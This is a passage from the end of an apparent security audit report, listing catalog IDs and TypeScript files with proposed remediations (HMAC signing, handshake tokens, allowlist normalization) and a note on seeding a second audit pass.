| F1733 `plainTextStorage.ts` | 20, 33 | Atomic-mode-on-create; libsecret backend on Linux |
| F0033 `workSecret.ts` | 34 | Mandatory HMAC; refuse `environment_variables` from unsigned blobs |
| F1404 `chromeNativeHost.ts` | 09, 23 | Handshake token; reject anonymous connects |
| F0668 `constants/oauth.ts` | 30 | Lowercase+IDNA-normalize allowlist; URL-parser validation |

---

*Pass 1 complete. Pass 2 should expand on adjacency: any catalog ID that landed
in two or more LEAKs above (F1804, F1380, F1162, F1733, F1031, F1035) becomes
the seed for a deeper data-flow trace in the next orchestrator iteration.*

